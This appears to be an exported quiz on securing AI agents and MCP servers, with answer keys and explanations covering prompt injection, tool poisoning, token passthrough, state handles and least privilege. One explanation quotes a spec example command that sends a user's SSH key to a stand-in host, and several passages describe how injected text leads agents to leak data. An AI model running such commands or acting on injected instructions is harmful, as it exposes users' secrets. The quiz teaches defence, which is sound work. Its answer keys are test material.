images.caption: An error message that includes a remote body is a prompt injection channel people often forget to review.

options.text: No. An error message with remote content in it is untrusted input and needs the same handling as any other tool result
Yes, because the model treats error channels as diagnostics, not instructions
Yes, because the `HTTP 403 from server:` prefix marks what follows as quoted third-party text
Yes, because setting `is_error: true` marks the content as untrusted for the model

questions.explanation:
This is indirect prompt injection through a channel people often forget to review. OWASP says indirect prompt injection happens when "an LLM accepts input from external sources, such as websites or files", and an error message that includes a remote body is one of those inputs. The only difference from the success path is which branch built the string. Error handlers are usually written for humans reading logs, so they include remote content freely and get reviewed last.

The two "the framing protects us" answers show the deeper misunderstanding. `is_error` is a routing flag that tells the client where to put the block, and it says nothing about trust. A text prefix is just more tokens in the same stream. No delimiter reliably turns attacker text into harmless data, which is why OWASP's mitigations are structural: separate and clearly mark external content, enforce privilege control, and require human approval for high-risk actions.

In practice, truncate remote bodies, strip or escape them, or report the status code with a short excerpt instead of the whole page.

The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. The third names the three root causes of Excessive Agency (functionality, permissions, and autonomy), each with its own fix, next to the mail-forwarding case, where read-only scopes prevent the outcome while logging and rate limits only limit the damage.

options.text: It's explicitly forbidden. Servers must not accept any token that wasn't issued specifically for that server
It's the recommended pattern, since it keeps the server stateless and avoids storing credentials
It's fine as long as the connection uses HTTPS
It's fine as long as the forwarded tokens are short-lived

questions.explanation:
MCP's security best practices name "token passthrough" as an anti-pattern, with a clear rule: "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server." You enforce it with audience validation, checking that the token's audience claim names this server.

The spec explains why the shortcut is worse than it looks:

- It bypasses security controls. Rate limiting, request validation, and traffic monitoring that rely on the token's audience stop working once any token is accepted.
- It breaks the audit trail. The server can't tell clients apart when they present opaque upstream tokens, and the downstream service's logs show the wrong identity.
- It breaks trust boundaries. If several services accept the same token, an attacker who compromises one can move into the others, and a server that forwards unchecked tokens becomes a ready-made proxy for stealing data.

HTTPS and short lifetimes don't help here. TLS protects a token in transit but says nothing about who it was issued for, and a short-lived token with the wrong audience still has the wrong audience.

images.caption: MCP has no protocol-level session, so a server that needs continuity creates a handle and gets it back as an ordinary tool argument.

options.text: That whoever presents the handle is the user it was created for, because having a handle is not authentication
Nothing more is needed once the handle is a random UUID instead of a sequential number
Nothing more is needed once handles expire after a limited time
Nothing more is needed, because the protocol authenticates state handles for the server

questions.explanation:
MCP is stateless and has no protocol-level session, so a server that needs continuity creates an explicit handle and gets it back as an ordinary tool argument. The line to remember from the specification: for authenticated servers, "a handle is a name, not a capability", and the server should check the caller's authorization for the handle on every call.

The matching attack is state handle hijacking, where someone gets or guesses a handle and uses it on another user's state. The mitigation is explicit: servers "**MUST NOT** treat possession of a state handle as authentication".

The recommended fix is to store state under `<user_id>:<handle>`, where the user id comes from the verified token and never from the client. A guessed handle then can't be used to impersonate anyone. The spec still recommends random, opaque handles with limited lifetimes, but those are defense in depth, and they don't replace authorization. Handles also pass through logs, transcripts, and model context, so "hard to guess" is weaker than it sounds.

questions.title: What does the MCP specification say about human oversight of tool invocation?

options.text: There should always be a human who can deny an invocation, and clients should show the tool's inputs before making the call
The protocol requires a specific consent dialog that every conforming client must show
Oversight is the server's job, since only the server knows what a tool really does
Confirmation is only required for tools with `destructiveHint: true`

questions.explanation:
In MCP, tools are model-controlled: the model finds and calls them on its own. The spec pairs that with a standing warning that "for trust & safety and security, there **SHOULD** always be a human in the loop with the ability to deny tool invocations". Applications should make it clear which tools are available, show when a tool is being called, and ask for confirmation.

What to show is where people go wrong. The client guidance is to "show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration", because the danger is often in the arguments rather than the tool. `send_email` looks harmless until you read the recipient, and `fetch_url` looks harmless until you see your private data in the query string.

The protocol deliberately doesn't require a particular UI, noting that "implementations are free to expose tools through any interface pattern". Only confirming tools marked `destructiveHint` gets trust backwards, because annotations are self-declared hints that clients must treat as untrusted.

questions.title: What's the main risk of one-click installation of a local MCP server?

options.text: The config launches a program with the client's own privileges, so installing one means running arbitrary code on the user's machine
Local servers can't be sandboxed by the operating system, unlike remote ones
The stdio transport is unencrypted, so another process can read the traffic
The only real risk is theft of tokens the server holds

questions.explanation:
The specification treats a compromised local server as a serious attack. Local servers are programs downloaded and run on the same machine as the client, and the spec shows what a malicious startup command in a shared config can do. Its example, `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`, sends off an SSH key before any tool is called. The risks it lists are arbitrary code execution with client privileges, no visibility into what runs, command obfuscation, data exfiltration, and data loss.

That's why clients that offer one-click setup **MUST** ask for consent first. They have to show the exact command without truncating it, flag it as potentially dangerous, and require explicit approval. The spec also recommends sandboxing the server, restricting its file and network access, and warning users that MCP servers run with the same privileges as the client.

So sandboxing is possible, and the spec recommends it. It prefers stdio because stdio limits access to just the client, and suggests an authorization token or a restricted Unix socket if you use HTTP instead. Stolen tokens are just one of the things arbitrary code execution can lead to.

questions.title: Which three capabilities make up the "lethal trifecta" for AI agents?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
images.caption: Simon Willison's lethal trifecta (June 2025): access to private data, exposure to untrusted content, and the ability to communicate externally.

options.text: Access to private data
Exposure to untrusted content
The ability to communicate externally
A long context window
Running without a system prompt

questions.explanation:
Simon Willison's framing, published in June 2025, names three capabilities:

1. Access to private data, which he calls "one of the most common purposes of tools in the first place".
2. Exposure to untrusted content: any way attacker-controlled text or images can reach the model.
3. The ability to communicate externally in a way that could be used to steal your data.

It makes a good review checklist because the risk comes from the combination. Each capability is reasonable on its own, and often the reason the agent exists. Together they form a complete path: injected instructions come in through the second, act on the first, and leave through the third.

Willison notes that MCP makes this worse because it encourages people to mix and match tools from different sources. A user can assemble a trifecta at runtime from three integrations that are each harmless and that no vendor ever reviewed together. Context length and whether there's a system prompt affect how much data is exposed and how the model behaves, but neither one creates or removes the path.
questions.references: [Simon Willison: The lethal trifecta for AI agents](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/)

questions.title: An agent has all three trifecta capabilities. Which mitigation actually makes it more secure?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
images.caption: Willison's advice: "avoid that lethal trifecta combination entirely".

options.text: Remove one capability at the architecture level, so the exfiltration path doesn't exist no matter what the model is told
Add a system prompt rule to ignore any instructions found in tool results
Add a detection classifier whose vendor says it catches 95% of injection attempts
Have the agent summarize untrusted content first and reason only over the summary

questions.explanation:
Willison's advice for anyone mixing tools is to "avoid that lethal trifecta combination entirely". Remove any one capability and the exfiltration chain breaks. This follows from how the system is built, so it holds however convincing the injected text is. An agent that can't send data out can't leak it, and an agent without access to private data has nothing to leak.

The other three options share one flaw: each relies on the model reliably resisting text written to change its behavior, and nobody knows how to make a model do that. On guardrails Willison is blunt: "we still don't know how to 100% reliably prevent this from happening". About vendors advertising 95% detection, he writes that "95% is very much a failing grade", because an attacker keeps trying until they land in the other 5%.

Summarizing first fails for a structural reason. The summarizer reads the same attacker text with the same trust, so it can be told to pass the payload along. Once untrusted content is in, everything after it inherits the problem.

questions.title: Besides tool results, where else can injected instructions reach a model in an MCP setup?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
images.caption: Tool poisoning (Invariant Labs, April 2025) hides malicious instructions in a tool's description, next to a believable summary of what the tool does.

options.text: In tool descriptions and schemas, which load into context at the start of the session, before any tool is called
Nowhere else, since only data returned by a tool enters the model's context
Only in messages the user types, since everything else is server configuration
Only in resources the user explicitly attaches, since those are fetched on demand

questions.explanation:
This is the tool poisoning attack, publicly disclosed by Invariant Labs in April 2025. Malicious instructions are hidden in a tool's description when it's registered, next to a believable summary of what the tool does. It works because the user and the model see different things. The user reads a short label in the client UI, while the model gets the full description word for word and can't reliably tell a real description from an attacker's instruction written in the same plain language.

Two things make it worse than injection through results. It works before any call, because the payload is in context from `tools/list`, so a poisoned tool doesn't need to be called to influence how the model uses other tools. Invariant's demos included a poisoned server that manipulated a separate WhatsApp integration in the same agent into leaking messages.

It also gives you more to review. Every field a server controls that ends up in the model's context, including descriptions, parameter descriptions, titles, annotations, and error text, is attacker-controlled when the server isn't trusted.

questions.title: A user approved a server's tools on day one. Why doesn't that approval last?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
images.caption: The tool set can change: servers send `notifications/tools/list_changed`, and the spec says the set "**MAY** change over time".

options.text: A server can change its tool list and descriptions later and announce it with a list-changed notification, so what runs may not be what was approved
Approvals expire after a fixed period defined by the protocol
It does last, because clients re-fetch and re-check definitions before every call
Only annotations can change after approval, because names, descriptions, and schemas are fixed once published

questions.explanation:
The tool set is allowed to change. Servers declare a `listChanged` capability and send `notifications/tools/list_changed` when their tools change, and the spec says the set "**MAY** change over time". So a server can show harmless tools during review and swap in different behavior later. This is the "rug pull" pattern, and it follows directly from tool poisoning: if descriptions act as prompt text, a description that can change is a prompt that can change.

Nothing in the protocol locks an approved definition in place. Tools have no signatures, clients can't require a version, and nothing is verified between re-fetching a list and putting it in the model's context. That's why the specification puts the burden on clients and users: treat annotations as untrusted, keep a human in the loop who can deny calls, and show tool inputs before calling.

The practical defenses sit at the same layer. Pin tool definitions and diff them across sessions, watch for changes, and ask the user again when a description changes, instead of trusting an approval given for text that no longer exists.

questions.title: What's the core idea behind design patterns that make agents provably resistant to prompt injection?

images.alt: Three panels on prompt injection. The first lines up the three trifecta capabilities in the order an attack uses them: exposure to untrusted content, access to private data, and communication to the outside, with arrows reading "instructions arrive" and "act on this", and a note that removing any one breaks the chain. The second lists four channels that carry attacker-controlled text into context: tool results, tool descriptions and schemas loaded from tools/list before any call, error strings quoting a remote body, and titles, parameter docs, and annotations. The third separates what changes the security property (removing a capability architecturally, and constraining the agent once untrusted input has entered) from what only raises the attacker's cost: guardrails and classifiers, a firmer system prompt, and summarizing the untrusted text first.
images.caption: Beurer-Kellner et al. propose design patterns for AI agents "with provable resistance to prompt injection".

options.text: Once an agent has read untrusted input, it must be constrained so that input can't trigger any consequential action
Fine-tune the model until it reliably spots and ignores injected instructions
Encode untrusted content, for example as base64, so instructions inside it aren't read as instructions
Have the system prompt repeat the agent's real goal often enough to outweigh injected text

questions.explanation:
Beurer-Kellner and co-authors propose "a set of principled design patterns for building AI agents with provable resistance to prompt injection", and the principle Willison takes from the work is the one in the correct answer. Once untrusted input is in, the agent's remaining permissions must be limited so the input can't cause a consequential action. Security then comes from how the system is built rather than from the model's judgment, and that's what makes it possible to reason about. The paper is open about trading usefulness for security, and each pattern makes that trade differently.

The other options all put the defense inside the model. Fine-tuning and repeating the goal make attacks harder without changing the underlying property, and attackers get unlimited attempts. It's the same reason a 95% detection rate is a failing grade.

Encoding is the most tempting and the least sound. Models decode base64 perfectly well, so the instruction survives intact and you get a false sense of a boundary.

images.alt: Three panels on authorization. The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. images.caption: OWASP LLM06:2025 names three root causes of Excessive Agency: excessive functionality, excessive permissions, and excessive autonomy.

options.text: Excessive functionality
Excessive permissions
Excessive autonomy
Excessive context length
Excessive sampling temperature

questions.explanation:
LLM06:2025 defines Excessive Agency as damaging actions taken in response to "unexpected, ambiguous or manipulated outputs from an LLM", and traces it to three root causes: excessive functionality, excessive permissions, and excessive autonomy.

Keeping them apart helps because each has its own fix:

- Excessive functionality is too much surface area, like an extension that also offers delete and modify when the task only needs read. Limit the extensions an agent can call, and the functions inside them, to the minimum needed, and avoid open-ended extensions where you can.
- Excessive permissions is too much authority: the extension's own downstream credential allows more than the task needs. Narrow the grant, and run actions in the individual user's context instead of under a shared privileged identity.
- Excessive autonomy is a missing checkpoint. Add human approval for high-impact actions.

Context length and sampling settings change how a model behaves. Neither changes what the agent is allowed to do, and that's what this risk is about.

questions.title: Which control would have prevented the mail-forwarding incident, instead of only limiting the damage?
questions.description: An assistant with mailbox access reads an email containing injected instructions and forwards a sensitive thread to an outside address. OWASP uses this scenario to illustrate Excessive Agency.

images.alt: Three panels on authorization. The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. The third names the three root causes of Excessive Agency (functionality, permissions, and autonomy), each with its own fix, next to the mail-forwarding case, where read-only scopes prevent the outcome while logging and rate limits only limit the damage.
images.caption: OWASP says this was preventable: remove unneeded mail functions, make the OAuth grant read-only, and require manual approval before sending.

options.text: Give the integration read-only mail scopes, remove the send capability, and require human approval before anything is sent
Log every tool call with full arguments, so the forward shows up in an audit trail
Rate-limit the mail extension to a few operations per minute
Add a system prompt rule that email content is data and must never be treated as instructions

questions.explanation:
OWASP's own analysis says this scenario was preventable by removing unneeded mail functions, restricting the OAuth grant to read-only, and requiring manual approval before messages are sent. The fix takes the capability away, so no injected text can use it. It's the trifecta argument applied to credentials: cut off external communication and the exfiltration path is gone.

OWASP makes the key distinction itself, listing logging and rate-limiting separately as ways to limit damage rather than prevent the vulnerability. Logging tells you after the fact, which helps with response and does nothing about the message already sent. Rate-limiting caps volume, and a single forwarded thread fits well inside any usable limit.

The prompt rule is the same losing bet as every other text-only defense against text an attacker wrote. Detection and throttling are still worth having as a second layer, behind a capability boundary that holds by itself.

```py
Only return records belonging to this user."""
# the DB credential is a shared service account with full read access
```

images.alt: Three panels on authorization. The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. The third names the three root causes of Excessive Agency (functionality, permissions, and autonomy), each with its own fix, next to the mail-forwarding case, where read-only scopes prevent the outcome while logging and rate limits only limit the damage.
images.caption: The only thing keeping users' data apart here is a sentence in a prompt.

options.text: The model is enforcing authorization instead of the system that holds the data. The credential should be scoped to that user and the check done downstream
Nothing, as long as the filtering instruction has regression tests
Nothing, since the model can't reach records it wasn't told about
It's only a performance problem, because the query scans more rows than needed

questions.explanation:
The only thing keeping users' data apart here is a sentence in a prompt, and plenty of ordinary things can knock it loose: an ambiguous request, an injected instruction inside a support ticket the agent reads, a mistyped id, or a summarization step that drops the rule from a compacted history. OWASP's preventions cover this directly: run extensions in the user's context, and enforce authorization in downstream systems instead of relying on the model to limit itself.

The fix is to make the wrong query impossible, not just discouraged. Use a per-user credential or a token the database enforces, such as row-level security, a scoped view, or a tenant-bound connection. Reading someone else's record then fails at the data layer, whatever the model intended.

MCP follows the same idea when it forbids token passthrough and requires servers to check authorization against a state handle on every call. Authority comes from a verified identity, never from what a caller says about itself. Tests over prompts only sample behavior, so they can't prove an invariant. And the claim that the model can't reach records it wasn't told about is simply false: whatever the credential can reach, the model can reach.

questions.title: Which scope model do MCP's security best practices recommend for authorizing an agent?

images.alt: Three panels on authorization. The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. The third names the three root causes of Excessive Agency (functionality, permissions, and autonomy), each with its own fix, next to the mail-forwarding case, where read-only scopes prevent the outcome while logging and rate limits only limit the damage.
images.caption: Start with a minimal set of low-risk read scopes, and ask for more only when a privileged operation needs them.

options.text: Start with a minimal, low-risk scope set and add scopes step by step, through targeted challenges the first time a privileged operation is attempted
Request every scope the server publishes up front, so the user consents once and is never interrupted again
Define one catch-all scope such as `full-access` to keep the consent screen short
Enforce scopes in the client, since it knows which tool the user called

questions.explanation:
The guidance is to "implement a progressive, least-privilege scope model":

- Start with a minimal scope set that only covers low-risk discovery and read operations.
- Add scopes step by step, using targeted `WWW-Authenticate` scope challenges the first time a privileged operation is attempted.
- Accept down-scoping: the server should accept tokens with fewer scopes, and the authorization server may grant a subset of what was requested.

The risks of asking for everything up front are worth bringing to a design review. A leaked broad token can do much more damage. Revoking it is harder, because revoking a maximum-privilege token breaks every workflow at once. Audit trails get noisier, since one catch-all scope hides what each operation was for. Privilege chaining gets easy, letting an attacker call high-risk tools without another prompt. And users give up on consent screens that ask for too much. The spec names "Using wildcard or omnibus scopes (`*`, `all`, `full-access`)" and "publishing all possible scopes in `scopes_supported`" as common mistakes.

Enforcing scopes in the client puts trust in the wrong place. A client-side check is only advisory, and the same section warns against "treating claimed scopes in token as sufficient without server-side authorization logic".

questions.title: Why is it safer to inject a credential at the network boundary than to put it in the agent's system prompt or memory file?

images.alt: Three panels on authorization. The first compares a tenancy boundary enforced by the model (a system prompt naming the current user while the credential is a shared service account) with one enforced by the system holding the data (a per-user credential the database itself checks, or row-level security and a tenant-bound connection). The second states three specification rules side by side: no token passthrough, verified by an audience check; a state handle is a name and not a capability, keyed as user_id and handle from the verified token; and a progressive least-privilege scope model that elevates on a targeted challenge. The third names the three root causes of Excessive Agency (functionality, permissions, and autonomy), each with its own fix, next to the mail-forwarding case, where read-only scopes prevent the outcome while logging and rate limits only limit the damage.
images.caption: A secret in context is a secret in the transcript, and it stays there for the rest of the session and beyond.

options.text: Anything in context is saved in history, replayed into later turns, and reachable by prompt injection, while a value swapped in on the way out is never seen by the model or the sandbox
It saves the tokens the credential would take up in every request
It stops the model from reformatting or truncating the key when it copies it into a request
There's no security difference, since the credential ends up in the outbound request either way

questions.explanation:
A secret in context is a secret in the transcript. It's stored in the conversation history, returned by any endpoint that lists events, folded into compaction summaries, and replayed into every later turn. Write it once and it stays for the whole session, and after that in logs and traces.

It's also reachable. Any injected instruction that gets the agent to quote its own instructions, or to write a memory file somewhere the attacker chooses, leaks it, and the model is exactly the part we can't make reliably resistant to such instructions. Anthropic's memory tool docs state the rule plainly: never store API keys, passwords, or tokens in memory files.

Swapping the secret in at the network boundary changes what's reachable, which matters more than making the attack harder. The agent's environment only holds a placeholder, the real value is added to the outbound request after it leaves the sandbox, and code the agent writes can't read it. MCP uses the same reasoning when it says server developers "**SHOULD NOT** mark sensitive parameters (passwords, API keys, tokens, PII)" for mirroring into HTTP headers, where network intermediaries can see them. The token savings are real but beside the point. Both approaches do end with the credential in the request. What differs is who can see it along the way.
